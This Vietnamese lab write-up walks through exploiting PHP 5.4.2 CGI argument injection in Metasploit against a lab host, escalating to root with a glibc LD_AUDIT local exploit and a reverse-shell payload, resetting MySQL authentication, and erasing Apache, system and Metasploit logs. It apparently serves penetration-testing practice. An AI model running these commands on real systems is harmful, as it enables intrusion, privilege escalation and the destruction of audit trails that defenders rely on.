# PHP 5.4 Vulnerability and Privilege Escalation Lab

Dự án này mô phỏng việc khai thác lỗ hổng trong PHP 5.4.2 để thực hiện leo thang đặc quyền sử dụng Metasploit và các công cụ pentesting khác. Lab bao gồm khai thác một máy chủ web dễ bị tấn công và leo thang đặc quyền từ tài khoản người dùng giới hạn lên quyền root.

### ***Mục lục***

[1. Lỗ hổng PHP là gì?](#1)

[2. Leo thang đặc quyền là gì?](#2)

[3.	Tại sao leo thang đặc quyền quan trọng trong tấn công?](#3)

[4. Chi tiết các bước trong Lab](#4)

- [4.1.	Quét máy chủ web](#4.1)

- [4.2.	Khai thác lỗ hổng PHP CGI ](#4.2)

- [4.3. Nâng cấp lên phiên Meterpreter ](#4.3)

- [4.4. Leo thang đặc quyền ](#4.3)

- [4.5. Truy cập cơ sở dữ liệu ](#4.3)

- [4.6. Xóa dấu vết ](#4.3)




<a name = '1'></a>
# 1.	Lỗ hổng PHP là gì?

**Lỗ hổng PHP** xuất hiện khi phiên bản PHP chứa các lỗi bảo mật có thể bị khai thác. **PHP 5.4.2** có lỗ hổng **PHP CGI Argument Injection**, cho phép kẻ tấn công thực thi mã từ xa mà không cần xác thực. Một số dạng lỗ hổng trong PHP bao gồm:
- **Remote Code Execution (RCE)**: Cho phép thực thi mã từ xa.
- **Local File Inclusion (LFI)**: Truy cập tệp tin trên máy chủ.
- **SQL Injection**: Tấn công cơ sở dữ liệu thông qua truy vấn SQL độc hại.

---


<a name = '2'></a>
# 2.	Leo thang đặc quyền là gì?

**Leo thang đặc quyền** là quá trình nâng quyền từ tài khoản người dùng bình thường lên tài khoản **quản trị** (root). Điều này cho phép kẻ tấn công có toàn quyền kiểm soát hệ thống:
- **Leo thang ngang**: Truy cập tài khoản người dùng khác.
- **Leo thang dọc**: Nâng quyền từ người dùng thường lên root.

---

<a name = '3'></a>
# 3.	Tại sao leo thang đặc quyền quan trọng trong tấn công

**Leo thang đặc quyền** giúp kẻ tấn công có thể:
- **Kiểm soát toàn bộ hệ thống**: Thay đổi, xóa dữ liệu hoặc cài đặt mã độc.
- **Duy trì quyền truy cập**: Thiết lập **backdoor** để duy trì quyền truy cập.
- **Tấn công sâu hơn**: Truy cập cơ sở dữ liệu và các thành phần khác.

---

<a name = '4'></a>
# 4.	Chi tiết các bước trong Lab

<a name = '4.1'></a>
## Bước 1: Quét máy chủ web
Sử dụng lệnh **Nmap** để xác định phiên bản PHP và phát hiện lỗ hổng.

```bash
nmap -p 80 --script=http-php-version 192.168.40.128
```

Kết quả: Quét phát hiện máy chủ web đang chạy **PHP 5.4.2**.
![image](https://github.com/user-attachments/assets/271d24d1-41d5-46e8-9c32-b49ab6aaf3b0)

---

<a name = '4.2'></a>
## 4.2.	Khai thác lỗ hổng PHP CGI
1. Khởi động Metasploit và tìm kiếm lỗ hổng:
   ```bash
   msf6 > search php cgi
   ```
![image](https://github.com/user-attachments/assets/6dc35cff-49cb-42c3-9a4e-908efe57f376)

2. Chọn và cấu hình khai thác:
   ```bash
   use exploit/unix/webapp/php_cgi_arg_injection
   ```
![image](https://github.com/user-attachments/assets/d81667ad-2956-450d-8923-40b8afd17838)

3. Đặt IP của máy chủ web mục tiêu:
   ```bash
   set rhosts 192.168.40.128
   ```
![image](https://github.com/user-attachments/assets/aa7a0fb5-9581-4c52-a89d-2e7ca27e2dbc)

4. Chạy khai thác để có quyền truy cập shell:
   ```bash
   run
   ```

Kết quả: Đã truy cập thành công với quyền **www-data**.
![image](https://github.com/user-attachments/assets/a2fcc9a6-9911-455f-a88a-700fb4d7a6da)

---

<a name = '4.3'></a>
## 4.3.	Nâng cấp lên phiên Meterpreter
1. Kiểm tra các phiên hoạt động:
   ```bash
   sessions
   ```
![image](https://github.com/user-attachments/assets/73fc1139-4d4a-472f-9d45-cae28f5b3412)

2. Nâng cấp lên phiên Meterpreter:
   ```bash
   session -u [session_id]
   ```
![image](https://github.com/user-attachments/assets/6c51b9c9-c776-401e-bf8e-b998c94072f1)
![image](https://github.com/user-attachments/assets/dffe45b8-0742-4ed9-b421-1322122deb17)


3. Tương tác với phiên Meterpreter:
   ```bash
   sessions -i [session_id]
   ```

Kết quả: Nâng cấp thành công lên Meterpreter.
![image](https://github.com/user-attachments/assets/75c910ce-2c64-4833-8d00-ce38289301a5)

---

<a name = '4.4'></a>
## 4.3. Leo thang đặc quyền

Sử dụng **Metasploit's Local Exploit Suggester** để tìm cách leo thang đặc quyền.
Model post/multi/recon/local_exploit_suggester trong Metasploit được dùng để kiểm tra hệ thống đang bị tấn công (được kết nối qua session) nhằm tìm kiếm các lỗ hổng có thể khai thác bằng các exploit có sẵn trong framework. Nó thực hiện việc này bằng cách chạy một loạt các kiểm tra dựa trên các mô-đun exploit cục bộ (local exploit) có trong Metasploit.
Tìm lỗ hổng tiềm ẩn: Thay vì thủ công thử từng exploit, mô-đun này thực hiện các kiểm tra nhanh chóng giúp xác định các exploit có khả năng thành công cao dựa trên thông tin thu thập được từ hệ thống.

1. Dùng module **local exploit suggester**:
   ```bash
   use post/multi/recon/local_exploit_suggester
   ```
![image](https://github.com/user-attachments/assets/219de827-e201-49b1-9cc6-03af54865bf0)

Các options phổ biến :
•	SESSION: ID của session dùng để kết nối với hệ thống mục tiêu.
•	VERBOSE: Hiển thị chi tiết quá trình kiểm tra.
•	LIMIT: Số lượng exploit tối đa để kiểm tra.


2. Chạy module để tìm khai thác khả thi:
   ```bash
   run
   ```
![image](https://github.com/user-attachments/assets/2c9ce3d5-a6f2-4c53-90d9-24563ed5d73c)

3. Khai thác lỗ hổng **glibc_ld_audit_dso_load_priv_esc**:
Model exploit/linux/local/glibc_ld_audit_dso_load_priv_esc này sử dụng LD_AUDIT để tải đối tượng chia sẻ libpcprofile.so, được phân phối với một số phiên bản của glibc và tận dụng chức năng tạo tệp tùy ý trong hàm tạo thư viện để ghi một tệp có thể ghi trên toàn thế giới thuộc sở hữu gốc vào đường dẫn tìm kiếm đáng tin cậy của hệ thống (thường là /lib). Sau đó, tệp sẽ được ghi đè bằng một đối tượng dùng chung rồi được tải bằng LD_AUDIT dẫn đến việc thực thi mã tùy ý.
   ```bash
   use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
   ```
![image](https://github.com/user-attachments/assets/388c13ea-a897-4e84-9c15-df45c512f57e)

5. Đặt các tùy chọn cần thiết:
Các options phổ biến :
•	SESSION: ID của session dùng để kết nối với hệ thống mục tiêu.
•	LHOST: Địa chỉ IP của máy tính của bạn, nơi payload sẽ tạo một kết nối ngược.
•	LPORT: Cổng trên máy tính của bạn mà payload sẽ tạo một kết nối ngược.
•	PAYLOAD: Loại payload, chẳng hạn như windows/meterpreter/reverse_tcp hoặc linux/x64/shell/reverse_tcp.
•	RHOST: Địa chỉ IP của hệ thống mục tiêu mà bạn muốn khai thác.
•	RPORT: Cổng trên hệ thống mục tiêu mà bạn muốn khai thác.

   ```bash
   set session [session_id]
   set LHOST [địa_chỉ_ip_của_bạn]
   set PAYLOAD linux/x64/shell/reverse_tcp
   ```
![image](https://github.com/user-attachments/assets/1f95760c-ab69-4f1e-91bd-b6ce5525193a)

7. Chạy khai thác:
   ```bash
   run
   ```
Cuối cùng, run để khai thác.
Vào shell kiểm tra id, người dùng là root.
Kết quả: Đã leo thang thành công lên **root**.
![image](https://github.com/user-attachments/assets/9a93c6e0-475d-4695-9763-77b10d4d561d)


---

<a name = '4.5'></a>
## 4.3.	Truy cập cơ sở dữ liệu

1. Dừng dịch vụ MySQL:
   ```bash
   /etc/init.d/mysql stop
   ```
![image](https://github.com/user-attachments/assets/8703feb5-73c2-4176-805b-970d6ca1f3e7)

2. Khởi động MySQL mà không yêu cầu mật khẩu:
   ```bash
   mysqld_safe --skip-grant-tables &amp;
   ```
![image](https://github.com/user-attachments/assets/24dde3e8-8494-48b3-b8a5-4b78a5e6f03c)

3. Truy cập cơ sở dữ liệu qua **phpMyAdmin** hoặc dòng lệnh.
![image](https://github.com/user-attachments/assets/a1e304d4-162d-46ab-bec0-1f368d1ebd8c)


4. Thay đổi mật khẩu hoặc thêm người dùng mới trong cơ sở dữ liệu.
![image](https://github.com/user-attachments/assets/97c40d09-4d1e-485b-9ddc-fde792f7ac13)

---
<a name = '4.6'></a>
## 4.3.	Xóa dấu vết

Để xóa dấu vết sau khi khai thác, cần xóa log hệ thống và log web server.

1. Xóa log Apache hoặc Nginx:
   ```bash
   echo > /var/log/apache2/access.log
   echo > /var/log/apache2/error.log
   ```

2. Xóa log hệ thống:
   ```bash
   echo > /var/log/auth.log
   echo > /var/log/syslog
   ```

3. Xóa log của Metasploit:
   ```bash
   rm -rf ~/.msf4/logs/
   ```
Link video thực hiện : https://youtu.be/GZgw2LahV6o?si=R3xC34NJzm-937z-



---



